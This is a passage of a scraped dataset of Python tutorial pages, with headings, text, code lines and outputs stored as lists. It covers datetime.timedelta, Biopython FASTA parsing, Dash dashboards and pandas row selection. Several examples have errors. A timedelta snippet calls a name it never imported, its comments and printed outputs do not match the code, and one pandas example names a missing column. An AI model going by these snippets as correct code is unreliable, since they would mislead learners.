2003, 2004, 2005, 2006)', ""The resultant dictionary is: {'English': 2001, 'Hindi': 2002, 'Mathematics': 2003, 'Computer Science': 2004, 'Physics': 2005, 'Chemistry': 2006}"", ""The values in sub_names are: ('English', 'Hindi', 'Mathematics', 'Computer Science', 'Physics', 'Chemistry')"", 'The values in sub_codes are: (2001, 2002, 2003, 2004, 2005, 2006)', ""The resultant dictionary is: {'English': 2001, 'Hindi': 2002, 'Mathematics': 2003, 'Computer Science': 2004, 'Physics': 2005, 'Chemistry': 2006}""]",[],"['|||Using setdefault()|||Using dict()|||Using Dictionary Comprehension|||Using zip() and dict()||||||In the first step, we have created a function that takes tuple and dictionary as an input.|||After this, we have used for loop to use the setdefault() and append the subject name and the subject code.|||Now we have initialized the values of our tuple and declared the resultant dictionary as {}.|||On executing the above program, the expected output is displayed.||||||In the first step, we have created a function that takes tuple and dictionary as an input.|||After this, we have used for loop to use the dict() that takes tuple as a parameter and returns a dictionary.|||Now we have initialized the values of our tuple and declared the resultant dictionary as {}.|||On executing the above program, the expected output is displayed.||||||Firstly, we have initialized the two tuples, sub_names, and sub_codes, and displayed them.|||After this, the decision-making keyword, if is used to check whether the length of both the tuples is the same or not, if it is the same then the functionality defined in the dictionary comprehension is performed.|||On executing the given program, the desired output is displayed.||||||Firstly, we have initialized the two tuples, sub_names, and sub_codes, and displayed them.|||After this, the decision-making keyword, if is used to check whether the length of both the tuples is the same or not, if it is the same then the functionality involving zip() and dict() is performed.|||On executing the given program, the desired output is displayed.|||']"
360,['datetime.timedelta() Function of Python'],"[""The 'timedelta()' function of Python is present in the datetime library, which is usually used to calculate differences in given dates. We can also use it to manipulate dates in Python, and this function makes it very easy for users to manipulate dates.""]","['https://www.javatpoint.com/python-bio-module', 'https://www.javatpoint.com/tuple-to-dictionary-in-python', 'https://www.javatpoint.com/python-bio-module', 'https://www.javatpoint.com/tuple-to-dictionary-in-python', 'https://www.javatpoint.com/python-bio-module']",[],[],['Conclusion'],"['Syntax:', 'Example 1:', 'Example 2:', 'Example 3:']",[],"['For better understanding, we will show how to use the ""datetime.timedelta()"" function the following example:', 'In this example, we will print the future dates of three years and three days:', 'In this example, we will see how we can print the past dates of two years and two hours:', 'In this example, we will calculate the difference between the two different dates:']",[],"[""In this tutorial, we learned about the 'datetime.timedelta()' function of the datetime library in Python. We have also discussed various examples for better understanding the concept of manipulating dates and calculating the difference between two dates.""]","['Datetime.timedelta(days = 0, seconds = 0, microseconds = 0, milliseconds = 0, minutes = 0, hours = 0, weeks = 0)', 'Return: Date', 'from datetime import datetime as D_T, timedelta as T_D', '# Using current time', 'initializing_time_for_now = D_T.now()', '# To print initial date', 'print (""Initial Date: "", str(initializing_time_for_now))', '# For Calculating the future dates of three years', 'Future_Date_After_THREE_yrs = initializing_time_for_now + \\', 'T_D(days = 1095)', '# For Calculating the future dates of three days', 'Future_Date_After_THREE_days = initializing_time_for_now + \\', 'T_D(days = 2)', '# Now, we will print the calculated future dates', ""print('Future Date after Three years: ', str(Future_Date_After_THREE_yrs))"", ""print('Future Date after Three days: ', str(Future_Date_After_THREE_days))"", 'from datetime import datetime as D_T, timedelta as T_D', '# Using current time', 'initializing_time_for_now = D_T.now()', '# To print initial date', 'print (""Initial Date:"", str(initializing_time_for_now))', '# For Calculating the past dates of two year', 'Past_Date_Before_TWO_yrs = initializing_time_for_now - \\', 'timedelta(days = 730)', '# For Calculating the past dates of two hours', 'Past_Date_Before_TWO_hours = initializing_time_for_now - \\', 'timedelta(hours = 2)', '# Now, we will print the calculated Past Dates', ""print('Past date before two years: ', str(Past_Date_Before_TWO_yrs))"", ""print('Past date before two hours: ', str(Past_Date_Before_TWO_hours))"", 'from datetime import datetime as D_T, timedelta as T_D', '# Using current time', 'initializing_time_for_now = D_T.now()', '# To print initial date', 'print (""Initial Date:"", str(initializing_time_for_now))', '# Some another datetime', 'New_time = initializing_time_for_now + \\', 'T_D(days = 7, hours = 6, milliseconds = 55, seconds = 12)', 'New_time_1 = initializing_time_for_now + \\', 'T_D(days = 12, hours = 64, milliseconds = 215, seconds = 90)', '# We will print the new time', 'print (""New calculated time: "", str(New_time))', '# Now, we will print the time difference between the two Dates:', ""print('Time difference between the given dates is:', str(New_time - \\"", 'initializing_time_for_now))', ""print('Time difference between the initial Date and New_time_1 is:', str(New_time_1 - \\"", 'initializing_time_for_now))']","['Initial Date: 2021-10-14 00:09:43.611036', 'Future Date after Two years: 2023-10-15 00:09:43.611036', 'Future Date after Two days: 2021-10-17 00:09:43.611036', 'Initial Date: 2021-10-14 00:19:18.449629', 'Past date before two years: 2019-10-15 00:19:18.449629', 'Past date before two hours: 2021-10-13 22:19:18.449629', 'Initial Date: 2021-10-14 00:31:13.920503', 'New calculated time:  2021-10-21 06:31:25.975503', 'Time difference between the given dates is: 7 days, 6:00:12.055000', 'Time difference between the initial Date and New_time_1 is: 14 days, 16:01:30.215000']",[],[]
361,['Python Bio Module'],"[""Most of us have thought about why Python is growing so much rapidly when we compare it with other programming languages? Yes, Python indeed got famous in a very short span of time, and now we can see applications of Python in every field. And, yes, every field means every field where technology can be seen. Python programming language is not only limited to programming or developing purpose, and now we can also see the use of it in various other fields like medical, business, defence, e-commerce etc. The major reason behind Python's huge development and reach is its simplicity, and numerous libraries come with it. Many fields are achieving a new height of success and development just because of the use of Python in them.""]","['https://www.javatpoint.com/python-dash-module', 'https://www.javatpoint.com/datetime-timedelta-function-of-python', 'https://www.javatpoint.com/python-dash-module', 'https://www.javatpoint.com/datetime-timedelta-function-of-python', 'https://www.javatpoint.com/python-dash-module']","['https://static.javatpoint.com/python/images/python-bio-module.png', 'https://static.javatpoint.com/python/images/python-bio-module2.png', 'https://static.javatpoint.com/python/images/python-bio-module3.png']",[],['Biopython Module'],"['Biopython Module: Introduction', 'Biopython Module: Features', 'Biopython Module: Goals', 'Biopython Module: Advantages', 'Biopython Module: Installation', 'Biopython Module: Implementation']","['Note: Bioinformatics is an interdisciplinary field that includes studies from biology and various other fields such as computer science, mathematics, physics, etc.', 'Note: There are many other ways to check the version of Python installed in our system, but we will prefer this one to use as this is the easiest and simplest method.']","['Following is the list of all the major or specific goals for building Biopython Module:', 'So, these are all the specific and major goals for which Biopython Module was built and introduced in Python as a package for bioinformatics.', 'Following are some of the advantages of using the Biopython Module for all the studies and work related to Bioinformatics:', 'When we press the enter key, the version of Python installed in our system will be displayed, as we can see in the output image.', 'When we press the enter key after writing the command, the pip installer will start installing the Biopython Module in our system.', 'We will first have to open notepad present in our system and write down the following content in it:', 'Look at the following Python program where we have parsed the sample fasta file using functions of Biopython Module:', 'Explanation:', 'We have displayed the following attributes with their respective functions of the Biopython Module:']","['We have now seen all the salient features of the Biopython Module, and now we can understand how useful this module is for all the work done in the bioinformatics field.', 'So, this is the list of all the advantages we have when we use Biopython Module, and it also depicts how this module is very helpful and useful for everyone connected with the field of bioinformatics.', ""Now, if we don't know the version of Python installed in our system and we want to check it, then we can use the following command in the command prompt terminal:"", 'Biopython Module is now successfully installed in our system, and now we can import it into a Python program to use its functions and learn its implementation.', 'As we can see in the output, all the attributes of the sample fasta file are successfully printed, and these attributes are printed for the first sequence firstly and then for the second sequence.', 'This is a sample file example that how we can use Biopython Module in the bioinformatics work and how it helps parse bioinformatics software files using a Python program.']","[""If we look again at the names of fields we have mentioned, we will find that we have also mentioned the medical field. Now, many of us will think that how Python can be helpful in the medical field. The answer to this question is not only limited to medical equipment used in a hospital or in a clinic but Python is also used in various other fields of medicine. One important field of medicine where Python can be seen is Bioinformatics, and we don't have to get confused here between genetics (which is Biotechnology) and bioinformatics."", 'In Python, we have a very famous module, Biopython, for bioinformatics, and the use of this module is rapidly increasing as many scientists are now using this module for their research. In this tutorial, we are going to study this Biopython module and learn a bit about it. We will also learn about its installation and how it is used for research work in bioinformatics through an example.', 'In Python or even in most programming languages, Biopython is not just the most popular but also the largest bioinformatics package. Biopython Module contains a lot of different sub-packages for performing common bioinformatics tasks. The Biopython module is mainly written in Python, but it also contains C code, and Chang and Chapman developed it. The C code present in the Biopython package is used to optimize the complex computation part of the module. The Biopython can run on multiple operating systems such as Windows, Linux, UNIX, Mac OS X, etc.', ""Before we start learning about Biopython Module, we must have a basic idea of bioinformatic terms such as DNA, RNA, protein sequences, genome sequences etc. Otherwise, it won't be easy to understand the working and functions of this module. Besides the basic terms of bioinformatics, we should make sure that the latest version of Python is present in our system and we are familiar with the pip installer."", 'The Biopython Module is a collection of different Python modules which provides many different functions to deal with various genetic structures such as DNA, RNA and protein sequence operations. The protein sequence operations we mentioned here can be finding motifs in protein sequence, reverse complementing of a DNA sequence, etc. In Biopython Module, we are provided with a lot of parsers and with the help of these parsers, we can read all the major genetic databases such as SwissPort, GenBank, FASTA, etc. These parsers are also very helpful in reading major wrappers/interfaces, which are very helpful in running other popular bioinformatics tools/software like Entrez, NCBI BLASTN etc. With the help of the Biopython Module, we can do all this inside a Python environment using a Python program.', 'Till now, we surely have an idea of how important the Biopython Module is and how it is helpful for all those who are related to the Bioinformatics field. Now, we will discuss the features that Biopython Module offers and for which it is famous. Following is the list of salient features of the Biopython Module:', ""As we all know, that Biopython Module is the best Python package for all fieldwork and research work in bioinformatics, but there would have been some goals for what this package was built. If we talk in general, Biopython Module was built with the goal to provide standard yet simple and extensive access to all the data and tools required for bioinformatics work through Python language. But this wasn't the only goal of building this module; there were other major goals too. We will discuss all these major goals for which the Biopython module was built and list them in this section."", ""We have now seen the features of the Biopython Module and how it can be very helpful to all of those connected with the field of bioinformatics. We can easily depict some of the advantages of this module, but still, there are some advantages that we can't guess with the listed features or goals. Therefore, in this section, we will see all the advantages of the Biopython Module and how it is helpful in many ways."", ""Now, we will learn about its implementation and its functioning in a Python program. We have to first install the Biopython Module in our system, and then only we will be able to import and use functions of this module in a Python program. Therefore, we will learn here about the installation process of the Biopython Module in our system, and we will also check the compatibility of Python installed in our device. This is because Biopython Module is supported in Python version above or equal to 2.5, and Python having version lesser than 2.5 do not support installation and importing of Biopython Module. That's why first we should make sure that Python installed in our system is of higher requisite or latest versions."", 'In the displayed version, we can see that version of Python installed in the system is higher than the required version. But if somehow the version of Python present in our system is not equal to or higher than the required version, i.e., Python version 2.5, then we should first update it and then only we can proceed with the installation part.', 'Now, after checking the version of Python installed in our system, we will look forward to installing the Biopython module, and we will use the pip installer to install this module. We will use the following pip installer command in the command prompt terminal to install the Biopython Module in our system:', ""To learn how the Biopython Module works and how it helps in parsing bioinformatics files, we have first to create a sample FASTA file (Here 'fasta' is referred to the file format sequence originated from the bioinformatics software). In FASTA file format, the sequence in the file is arranged one by one, and each sequence present in the file will have its own ID, name, description and actual sequence data."", ""Now, we have to save this notepad file with the name 'SampleFile1.fasta', and we have to save this in the same directory where Python is installed so that we don't have to write the whole directory while opening the file. It's time that we will use Biopython Module in a Python program and learn its implementation by parsing the sample fasta file we created."", ""We have firstly imported the different tools of the Biopython Module in the program, such as parse, SeqRecord and Seq, using the 'from' keyword. Then, we opened the sample fasta file we created in the program using the open() function. After that, we have used the parse() function on the variable we initialized to open the sample file, i.e., sampleFile. Then, we looped over the parseRecords variable (Initialized variable where file parsed) to print the different properties and attributes from the file.""]","['python --version', 'pip install biopython', '# Importing required functions from Biopython module', 'from Bio.SeqIO import parse', 'from Bio.SeqRecord import SeqRecord', 'from Bio.Seq import Seq', '# Open the sample FASTA file we have created', 'sampleFile = open(""SampleFile1.fasta"")', '# Parsing the file in the Python program', 'parseRecords = parse(sampleFile, ""fasta"")', '# Using for loop to printing attributes of files', 'for record in parseRecords:', '# Printing multiple attributes of the file', 'print(""Id of FASTA File: %s"" % record.id)', 'print(""Name of FASTA File: %s"" % record.name)', 'print(""Description of FASTA File: %s"" % record.description)', 'print(""Annotations in FASTA File: %s"" % record.annotations)', 'print(""Sequence Data in FASTA File: %s"" % record.seq)']","['Id of FASTA File: sampleFile|P2426|FMS1_ECOLI', 'Name of FASTA File: sampleFile|P2426|FMS1_ECOLI', 'Description of FASTA File: sampleFile|P2426|FMS1_ECOLI CS1 is a fimbrial subunit of the precursor (Have CS1 pilin)', 'Annotations in FASTA File: {}', 'Sequence Data in FASTA File: MKLKKTIGADALATLFATMGASAVEKTISVTASVDMTVDLLQSDGSALPNSVALTYSPAVNNFEAHTINTVVQTNDSDKGVVVKLSAMPVLSNVLNPTLQIPVSVNFAGKPLSTTGITIDSNDLNFASSGVNKVSMTQKLSIHADATRVTGGALTAGQYQGLVSIILTKSTTTTTTTKGT', 'Id of FASTA File: sampleFile|P2631|FMS3_ECOLI', 'Name of FASTA File: sampleFile|P2631|FMS3_ECOLI', 'Description of FASTA File: sampleFile|P2631|FMS3_ECOLI CS3 is a fimbrial subunit of the precursor (Have CS3 pilin)', 'Annotations in FASTA File: {}', 'Sequence Data in FASTA File: MLKIKYLLIGLSKSAMSSYSLAAAGPTLTKELALTVLSPAALDATWAPQDNLTLSNTGVSNTLVGVLTLSNTSIDTVSIANTNVSDTSKNGTVTFAHETNNSASFATTISTDNANITLDKNAGNTIVKTTNGSPLPTNLPLKFITTEGNEHLVSGNYRANITITSTIKGGGTKKGTTDKK']",[],"['|||Biopython Module has easy to learn, easily portable and very clear syntax.|||Biopython Module gives us the option by which we can deal with protein sequence formats.|||Biopython Module gives us various tools through which we can manage different types of protein structures.|||Biopython Module is object-oriented, interpreted and interactive same as Python.|||Biopython Module provides us access to many local bioinformatics services that includes Clustalw, Blast, EMBOSS etc.|||Biopython Module supports various bioinformatics file formats such as SCOP, FASTA, Medline or PubMed, PDB, ExPaSY-related formats and GenBank.|||With Biopython Module, we can access various online services and databases like NCBI services, including PubMed, Blast, Entrez, etc., and ExPaSY services like Prosite and SwissPort.|||Biopython Module also gives us the option of BioSQL, a standard set of SQL tables, and we can use them to store sequences plus features and annotations.||||||Biopython Module was built for helping in performing genomic data analysis.|||Biopython Module was built with the goal of providing high-quality & reusable scripts and modules.|||One of the goals for building the Biopython Module was to provide standardized access to all bioinformatics resources.|||Biopython Module was also built with the goal of having fast array manipulation, which can be used in PDB, Markov Models, NaiveBayes and Cluster codes.||||||Biopython Module provides us with different microarray data types used in the clustering process.|||Biopython Module also provides support to all types of journal data used in medical applications.|||Biopython Module gives us the option to clear documentation that is based on cookbook style.|||Biopython Module is also very helpful in reading and writing different files having Tree-view type.|||Biopython Module is very helpful as it supports parser development by providing various sub-modules that can be used to parse a bioinformatics file into a generic class of sequence plus features or a format specific record object.|||Biopython Module also supports the structure data that is used for PDB representation, analysis and parsing.|||Biopython Module also provides supports to various bioinformatics databases such as the BioSQL database (A database that is widely used as a standard database amongst all the projects of bioinformatics).||||||We printed id from the file using record.id,|||We printed the name of the sequence in the file using record.name,|||We used record.description to print the description of the sequence present in the file,|||We used record.annotations to print annotations of the sequence,|||and last, we used record.seq to print sequences present in the sample file.|||']"
362,['Python Dash module'],"['We all have surely heard many times that Python is a dynamically typed programming language, but not all of us maybe know that we can also use Python for web development purposes. Yes, it is right, we can use Python for web development, and there are many modules present in Python which help us in this task. In this tutorial, we are going to discuss one such Python module, i.e., the Dash module, which help us to perform web development tasks using Python. We will first look at the introduction of the Dash module, and then we will build a basic dashboard and web application using the Python dash module.']","['https://www.javatpoint.com/python-emoji-module', 'https://www.javatpoint.com/python-cmdparser-module', 'https://www.javatpoint.com/python-emoji-module', 'https://www.javatpoint.com/python-cmdparser-module', 'https://www.javatpoint.com/python-emoji-module']","['https://static.javatpoint.com/python/images/python-dash-module.png', 'https://static.javatpoint.com/python/images/python-dash-module2.png', 'https://static.javatpoint.com/python/images/python-dash-module3.png', 'https://static.javatpoint.com/python/images/python-dash-module4.png']",[],"['Introduction to Python Dash Module', 'Application of Dash Module', 'Conclusion']","['Installation of Dash Module:', 'Creating a Basic Dashboard:', 'Creating Web Application with Dash Callbacks:']",[],"['Step 1: Open the command prompt terminal of the device and locate the directory (using mkdir command) where Python is installed in the system.', 'Step 2: Now write the following command in the terminal to install the Dash module with pip installer:', 'Step 3: When we press the enter key, the pip installer will start installing the Dash module in the system at our defined path.', 'As we can see, the Dash module is successfully installed in our system, and now we can start working with it by importing it into a program.', 'We will create the following two simple web applications using the Dash module in this part:', 'We will build a simple dashboard using the Dash module by following all these given below steps:', 'Step 1: Import all the required libraries:', 'We can import all these above-mentioned required libraries in a Python program using the following code:', 'The dash core components provide us with the following core components of dash:', 'and the dash HTML component has the following HTML function components:', 'Step 2: Design the Layout:', 'Now, look at the following part of the code where we have created a layout and a graph for the web application:', 'Step 3: Create a Server:', 'Explanation:']","['First, we will have to import all the required libraries inside our Python program so that we can use all the required functions for building a dashboard. We have first to import the following dash library components in the program:', 'When we run the program, it will show the default port link in the output, and we have to open our default browser and run the link inside it to see the web application we have built.', 'When we run the above program, the server will redirect us to the localhost with default port 8050, and we have to open it in the default browser of our system so that we can see the web application.']","['Dash is a Python module or framework used to create many analytical web applications, and we can build analytical dashboards using a dash framework. With the help of the Dash module, we can easily create very fast and responsive web dashboards, which are also very good to look at (Having a Great User Interface). When we are using the Dash module, we can build these interactive web dashboards without having any prior knowledge of some mandatory complex front-end web frameworks such as JavaScript, HTML, CSS etc.', 'Now, we have learned what the Dash module is and completed its introduction part; it is time that we should build our first dashboard using the Dash module. But, before building a web application or dashboard using the Dash framework, we have to install the dash module in our system (as it is not a built-in module in Python). Once the installation process of this module is done, we will proceed to the application part of the Dash module.', 'In this section, we will learn how we can install the Dash module in our system so that we can import it into a Python program and its functions to use it as a web framework. We have to follow the following steps to install the Dash module in the system:', 'We will now learn the applications of the Dash module by building a basic dashboard, and after that, we will also build a web application using callbacks so that we can use analytical features in it. With the help of these two basic implementations, we will learn that how we can use the dash framework to build web applications that are very fast and have very good UI.', 'In this section, we will create a simple web dashboard using the Dash module libraries and their functions inside a Python module. The Dashboard we will create in this section will be a simple and static but responsive web dashboard. In the dashboard, we will build a static and responsive graph on the web page using the dash module.', ""In this step, we will design a layout for the web application we are building using Dash's HTML components, core components, and library functions. After creating the layout, we will make a graph, and the graph we create will have various parameters. Following are such parameters that we will use while creating a graph with Dash HTML components:"", 'In the above program, we have html components like dhc.h1 or dhc.div is actually like the components in HTML where dhc.h1 is like heading in HTML and dhc.div is like div class in HTML. We can also interpret the following points from the above-given part of the program:', 'The dashboard is completely ready after we created a layout for the application, but we need a server where we can run it. Therefore, now we will set up a server using the following part of the code in the program and run the dashboard on the server will be created:', ""We can see that we have created a web application, a basic static web application. In this web application, the user cannot take control of the application, and we can't even take inputs from the user. That's why we are going to build a web application where we use the callbacks (that are provided in Dash) to take input from the user and give results according to it."", 'In this section, we will create a web application using the Dash functions and components of Dash like we used while creating a basic dashboard. But we will also use callbacks from the dash to create an application so that we can take user input in the dashboard we build. Here, we will not build the web application step-by-step as we did earlier. We will first look at the following program where we have created a web application with callbacks, and then we will understand the implementation of function and callbacks in the program:', 'When we ran the server and opened the web application dashboard in the web browser with the default port, the application asked for an input value. When we give an input value inside the box, the application will calculate the cube of the given number and give the result of the operation as the output value (we can see this in the output image).', 'In the above example, we used a similar logic as we used in the first example, but we have used many different functions and logic too. First of all, we have imported an additional library in this function, i.e., dash dependencies, to use the input and output function in the web application. While creating the layout, here, we have created a dialogue box where we defined the input and output division class. After that, we have used dash callback so that we can take input from the user and perform an operation on it to produce the output where the output will be the result of the operation. We used exception handling so that if the input value is not a number, we can raise an error. In last, we created a server and ran the application on it.', ""We have two web applications in this tutorial in which one is with a static graph, and the other uses callbacks from the dash. Maybe these web applications are not useful for us, but with the help of these web application's implementation, we can now understand the functions of the Dash library and how to use the Dash module for building a web application.""]","['pip install dash', '# Importing dash library as dsh', 'import dash as dsh', '# Importing dash core components as dc2', 'import dash_core_components as dc2', '# Importing html components from the dash', 'import dash_html_components as dhc', '# Initializing a variable for web application', 'webApp = dsh.Dash()', '# Creating layout for the dashboard', 'webApp.layout = dhc.Div(children =[', 'dhc.H1(""Tutorial on building a web application using Dash""), # Title of the page', 'dc2.Graph(', 'id =""graphExample"", # ID of graph', 'figure ={ # Creating Graph figure', ""'data':["", ""{'x':[1, 3, 5, 7, 9, 11, 13],"", ""'y':[7, 6, 8, 4, 5, 9, 3],"", ""'type':'line',"", ""'name':'Trucks'},"", ""{'x':[1, 3, 5, 7, 9, 11, 13],"", ""'y':[6, 5, 7, 3, 4, 8, 2],"", ""'type':'bar',"", ""'name':'Ships'}"", '],', ""'layout':{ # Layout of the graph"", ""'title':'A Basic Graph for Dashboard' # Title of the graph"", '}', '}', '# Creating a server for the dashboard to run on it', ""if __name__ == '__main__':"", 'webApp.run_server()', '# Importing dash library as dsh', 'import dash as dsh', '# Importing dash core components as dc2', 'import dash_core_components as dc2', '# Importing html components from dash', 'import dash_html_components as dhc', '# Importing dependencies for using input & output', 'from dash.dependencies import Input, Output', 'webApp = dsh.Dash()', '# Layout for the application', 'webApp.layout = dhc.Div(children = [', '# Using input to take input', ""dc2.Input(id = 'input'),"", '# Creating div class for output', ""dhc.Div(id ='output')"", '# Using dash callback for input and output', '@webApp.callback(', '# Returning the output', ""Output(component_id = 'output', component_property = 'children'),"", '# Taking the input value', ""[Input(component_id = 'input', component_property = 'value')]"", '# A default function to perform operation with input value', 'def update_value(input_data):', 'try:', 'return str(float(input_data) ** 3)  # Cube of Input value', 'except:', 'return ""Error, the input value given is not a numeric value""  # If the input value is not a number', '# Creating a server for the dashboard to run on it', ""if __name__ == '__main__':"", 'webApp.run_server()']",[],[],"['|||Dash library|||Dash core components|||Dash HTML components||||||Inputs|||graphs|||buttons etc.||||||Paragraph tags|||Body tags|||Meta tags etc.||||||figure (which will be the graph itself)|||id (By this, we will assign a unique ID to a particular graph)|||layout (It includes a basic layout for the graph, data of both X and Y-axis, the title of the graph etc.)||||||We can easily understand that a figure parameter is essentially a dictionary in which we can define the elements like name, type, x, y etc.|||The name parameter we used in the above code refers to the name associated with the axis of the graph.|||The type parameter we used is referred to the type of graph we want to project in the dashboard, and it can be a line, bar etc.|||x and y can be a single value or a list of values (where values inside x and y are referred to the X-axis and Y-axis, respectively).|||&&&|||A Basic Dashboard|||Web applications with callbacks|||']"
363,['How to Select rows in Pandas DataFrame Based on Conditions'],"['In this tutorial, we will learn how a user can select rows in Pandas DataFrame based on conditions using Python.']","['https://www.javatpoint.com/typecasting-in-python', 'https://www.javatpoint.com/python-dash-module', 'https://www.javatpoint.com/typecasting-in-python', 'https://www.javatpoint.com/python-dash-module', 'https://www.javatpoint.com/typecasting-in-python']",[],[],['Conclusion'],"['Conditions:', 'Condition 1:', 'Condition 2:', 'Condition 3:', 'Condition 4:', 'Condition 5:', 'Condition 6:', 'Condition 7:', 'Condition 8:']",[],"[""Users can select rows based on a particular column value using '>', '=', '<=', '>=', '!=' operators."", 'We will discuss different conditions that can be applied to the Pandas DataFrame.', ""Select all the rows from the DataFrame in which 'Percentage' is greater than 70 using the basic method."", 'Select all the rows from the DataFrame in which \'Percentage\' is greater than 70 by using the ""loc[]"" method.', 'Select all the rows from the DataFrame in which \'Percentage\' is not equal to 71 using the ""loc[]"" method.', 'Now, we will learn how to select those rows whose column value is present in the list by using the ""isin()"" function of the DataFrame.', 'Select all the rows from the given DataFrame in which column value of ""Subjects_1"" is present in the ""Subjects_2"" list by using the basic method.', 'Select all the rows from the given DataFrame in which column value of ""Subjects_1"" is present in the ""Subjects_2"" list by using the ""loc[]"" method.', 'Now, we will learn how to select rows based on multiple column conditions by using the ""&"" operator.', 'In this tutorial, we have discussed how to select different rows of Pandas DataFrame based on various conditions.']","['Select all the rows from the given DataFrame in which column value of ""Subjects_1"" is not present in the ""Subjects_2"" list by using the ""loc[]"" method.', 'Select all the rows from the given DataFrame in which ""Percentage_1"" is equal to ""71"" and ""Subject_1"" is present in the ""Subject_2"" list by using the basic method.', 'Select all the rows from the given DataFrame in which ""Percentage_1"" is equal to ""71"" and ""Subject_1"" is present in the ""Subject_2"" list by using the ""loc[]"" method.']",[],"['# First, import pandas', 'import pandas as pnd', 'record_1 = {', ""'Name_1': ['Anuj', 'Ashu', 'Yashi', 'Mark', 'Joshua', 'John', 'Ray', 'Lilly', 'Rose', 'Rachel' ],"", ""'Age_1': [23, 24, 21, 19, 21, 24, 25, 22, 23, 22],"", ""'Subjects_1': ['DBMS', 'ADS', 'ASPM', 'BCM', 'MFCS', 'ADS', 'ASPM', 'TOC', 'Data Mining', 'OOPS'],"", ""'Percentage_1': [88, 62, 85, 71, 55, 78, 70, 66, 71, 89] }"", '# Now, we are creating a dataframe', ""Data_Frame = pnd.DataFrame(record_1, columns = ['Name_1', 'Age_1', 'Subject_1', 'Percentage_1'])"", 'print(""Given DataFrame: \\n"", Data_Frame)', '# Then we will select rows based on condition', ""result_DataFrame = Data_Frame[Data_Frame['Percentage_1'] > 70]"", ""print('\\nFollowing is the Result DataFrame: \\n', result_DataFrame)"", '# First, import pandas', 'import pandas as pnd', 'record_1 = {', ""'Name_1': ['Anuj', 'Ashu', 'Yashi', 'Mark', 'Joshua', 'John', 'Ray', 'Lilly', 'Rose', 'Rachel' ],"", ""'Age_1': [23, 24, 21, 19, 21, 24, 25, 22, 23, 22],"", ""'Subjects_1': ['DBMS', 'ADS', 'ASPM', 'BCM', 'MFCS', 'ADS', 'ASPM', 'TOC', 'Data Mining', 'OOPS'],"", ""'Percentage_1': [88, 62, 85, 71, 55, 78, 70, 66, 71, 89] }"", '# Now, we are creating a dataframe', ""Data_Frame = pnd.DataFrame(record_1, columns = ['Name_1', 'Age_1', 'Subjects_1', 'Percentage_1'])"", 'print(""Given DataFrame: \\n"", Data_Frame)', '# Then we will select rows based on condition, That is, Using loc[] method', ""result_DataFrame = Data_Frame.loc[Data_Frame['Percentage_1'] > 70]"", ""print('\\nFollowing is the Result DataFrame: \\n', result_DataFrame)"", '# First, import pandas', 'import pandas as pnd', 'record_1 = {', ""'Name_1': ['Anuj', 'Ashu', 'Yashi', 'Mark', 'Joshua', 'John', 'Ray', 'Lilly', 'Rose', 'Rachel' ],"", ""'Age_1': [23, 24, 21, 19, 21, 24, 25, 22, 23, 22],"", ""'Subjects_1': ['DBMS', 'ADS', 'ASPM', 'BCM', 'MFCS', 'ADS', 'ASPM', 'TOC', 'Data Mining', 'OOPS'],"", ""'Percentage_1': [88, 62, 85, 71, 55, 78, 70, 66, 71, 89] }"", '# Now, we are creating a dataframe', ""Data_Frame = pnd.DataFrame(record_1, columns = ['Name_1', 'Age_1', 'Subjects_1', 'Percentage_1'])"", 'print(""Given DataFrame: \\n"", Data_Frame)', '# Then we will select rows based on condition, That is, Using loc[] method', ""result_DataFrame = Data_Frame.loc[Data_Frame['Percentage_1'] != 71]"", ""print('\\nFollowing is the Result DataFrame: \\n', result_DataFrame)"", '# First, import pandas', 'import pandas as pnd', 'record_1 = {', ""'Name_1': ['Anuj', 'Ashu', 'Yashi', 'Mark', 'Joshua', 'John', 'Ray', 'Lilly', 'Rose', 'Rachel' ],"", ""'Age_1': [23, 24, 21, 19, 21, 24, 25, 22, 23, 22],"", ""'Subjects_1': ['DBMS', 'ADS', 'ASPM', 'BCM', 'MFCS', 'ADS', 'ASPM', 'TOC', 'Data Mining', 'OOPS'],"", ""'Percentage_1': [88, 62, 85, 71, 55, 78, 70, 66, 71, 89] }"", '# Now, we are creating a dataframe', ""Data_Frame = pnd.DataFrame(record_1, columns = ['Name_1', 'Age_1', 'Subjects_1', 'Percentage_1'])"", 'print(""Given DataFrame: \\n"", Data_Frame)', ""Subjects_2 = ['ASPM', 'ADS', 'TOC']"", '# Then we will select rows based on condition, That is, Using isin[] method', ""result_DataFrame = Data_Frame[Data_Frame['Subjects_1'].isin(Subjects_2)]"", ""print('\\nFollowing is the Result DataFrame: \\n', result_DataFrame)"", '# First, import pandas', 'import pandas as pnd', 'record_1 = {', ""'Name_1': ['Anuj', 'Ashu', 'Yashi', 'Mark', 'Joshua', 'John', 'Ray', 'Lilly', 'Rose', 'Rachel' ],"", ""'Age_1': [23, 24, 21, 19, 21, 24, 25, 22, 23, 22],"", ""'Subjects_1': ['DBMS', 'ADS', 'ASPM', 'BCM', 'MFCS', 'ADS', 'ASPM', 'TOC', 'Data Mining', 'OOPS'],"", ""'Percentage_1': [88, 62, 85, 71, 55, 78, 70, 66, 71, 89] }"", '# Now, we are creating a dataframe', ""Data_Frame = pnd.DataFrame(record_1, columns = ['Name_1', 'Age_1', 'Subjects_1', 'Percentage_1'])"", 'print(""Given DataFrame: \\n"", Data_Frame)', ""Subjects_2 = ['ASPM', 'ADS', 'TOC']"", '# Then we will select rows based on condition, That is, Using isin[] method', ""result_DataFrame = Data_Frame.loc[Data_Frame['Subjects_1'].isin(Subjects_2)]"", ""print('\\nFollowing is the Result DataFrame: \\n', result_DataFrame)"", '# First, import pandas', 'import pandas as pnd', 'record_1 = {', ""'Name_1': ['Anuj', 'Ashu', 'Yashi', 'Mark', 'Joshua', 'John', 'Ray', 'Lilly', 'Rose', 'Rachel' ],"", ""'Age_1': [23, 24, 21, 19, 21, 24, 25, 22, 23, 22],"", ""'Subjects_1': ['DBMS', 'ADS', 'ASPM', 'BCM', 'MFCS', 'ADS', 'ASPM', 'TOC', 'Data Mining', 'OOPS'],"", ""'Percentage_1': [88, 62, 85, 71, 55, 78, 70, 66, 71, 89] }"", '# Now, we are creating a dataframe', ""Data_Frame = pnd.DataFrame(record_1, columns = ['Name_1', 'Age_1', 'Subjects_1', 'Percentage_1'])"", 'print(""Given DataFrame: \\n"", Data_Frame)', ""Subjects_2 = ['ASPM', 'ADS', 'TOC']"", '# Then we will select rows based on condition, That is, Using isin[] method', ""result_DataFrame = Data_Frame.loc[~Data_Frame['Subjects_1'].isin(Subjects_2)]"", ""print('\\nFollowing is the Result DataFrame: \\n', result_DataFrame)"", '# First, import pandas', 'import pandas as pnd', 'record_1 = {', ""'Name_1': ['Anuj', 'Ashu', 